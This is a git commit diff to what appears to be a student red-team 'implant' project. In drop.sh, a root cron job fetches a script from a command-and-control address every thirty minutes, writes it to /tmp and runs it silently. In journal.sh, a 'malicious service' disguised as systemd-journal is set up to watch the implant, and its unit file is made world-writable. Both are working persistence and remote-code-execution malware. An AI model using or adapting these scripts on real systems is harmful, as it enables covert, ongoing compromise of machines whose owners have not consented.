73f1184ed4123a9be7d076a02adb540c9f3542b1
AshleyNikr <arn4006@g.rit.edu>
2022-04-14 09:58:44 -0400

    Updated bash scripts, added wipe.sh

--- implant/linux/cron/drop.sh
+++ implant/linux/cron/drop.sh
@@ -1,5 +1,11 @@
 #!/bin/bash
+# 
+# Script that creates a cronjob that
+# retrieves scripts from Bifrost, writes
+# them to tmp, and then executes them
+#
+
 sudo crontab -l > cron_bkp
-sudo echo "*/30 * * * * sudo wget http://129.21.101.121:5000/api/1.1/retrieve_scripts -O /vagrant/test.py && /usr/bin/python3 /vagrant/test.py >/dev/null 2>&1" > cron_bkp
+sudo echo "*/30 * * * * sudo wget http://129.21.101.121:5000/api/1.1/retrieve_scripts -O /tmp/implant.py && /usr/bin/python3 /tmp/implant.py >/dev/null 2>&1" > cron_bkp
 sudo crontab cron_bkp
 sudo rm cron_bkp
--- implant/linux/services/journal.sh
+++ implant/linux/services/journal.sh
@@ -1,4 +1,8 @@
 #!/bin/bash
+#
+# Creates a malicious service named systemd-journal
+# that is monitoring the base implant script.
+#
 
 sudo chmod 777 /etc/systemd/system/systemd-journal.service
 sudo systemctl daemon-reload
